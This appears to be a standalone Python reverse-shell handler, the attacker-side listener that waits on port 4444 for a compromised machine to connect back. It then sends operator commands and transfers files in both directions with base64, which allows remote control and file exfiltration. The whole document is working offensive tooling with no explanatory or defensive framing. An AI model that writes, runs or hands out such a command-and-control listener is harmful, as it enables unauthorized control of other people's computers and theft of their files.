#!/usr/bin/env python

import socket
import json
import base64

HOST_IP = "10.0.0.202"
PORT = 4444

listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listner.bind((HOST_IP,PORT))
listner.listen(0)
print("[+] Waiting for Connection")
connection, address = listner.accept()
print(f"[+] Connection to {address} Established")

while True:
	com = input()
	if "exit" in com:
		comj = json.dumps(com)
		connection.send(comj.encode("utf-8"))
		connection.close()
		exit()
	else:
		comj = json.dumps(com)
		connection.send(comj.encode("utf-8"))
		if "upload" in com:
			coml = com.split(" ")
			with open(coml[1],"rb") as f:
				result = base64.b64encode(f.read())
				resultj = json.dumps(result.decode("utf-8"))
				connection.send(resultj.encode("utf-8"))
			result = connection.recv(1028)
			resultj = json.loads(result)
			print(resultj)
		else:
			result = "".encode("utf-8")
			while True:
				try:
					result = result + connection.recv(1028)
					resultj = json.loads(result)
					if "download" in com:
						coml = com.split(" ")
						resultj = base64.b64decode(resultj)
						with open(coml[1],"wb") as f:
							f.write(resultj)
						print("[+] Download Complete")
					else:
						print(resultj)
					break
				except:
					continue



